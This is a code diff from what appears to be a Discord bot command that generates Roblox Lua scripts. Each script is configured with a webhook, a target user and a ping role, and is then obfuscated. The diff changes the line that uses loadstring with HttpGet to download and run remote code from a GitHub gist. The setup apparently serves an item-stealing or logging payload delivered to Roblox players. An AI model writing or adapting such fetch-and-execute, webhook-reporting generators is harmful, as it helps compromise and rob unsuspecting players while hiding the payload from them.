@@ -55,10 +55,10 @@ export async function execute(interaction) {
 _G.YOUR_WEBHOOK = '${webhook}'
 _G.TARGET_USER = '${target}'
 _G.PING_ROLE_ID = '${pingRole}'
-loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859-ui/8cac02e02ce7d86743822761c71e741b/raw/df692088f170df8d44230d5133779638a0080932/MM2ANTIWARE', true))()
+loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859-ui/9fd33a4b9399bbb8f038b9dfc2223ed9/raw/8d43622c9f56b3791e09df782d62ba85f0222101/gistfile1.txt', true))()
 `;
 
-  // Defer the reply with "thinking" status
+  // Defer the reply
   await submitted.deferReply();
 
   let obfuscated;
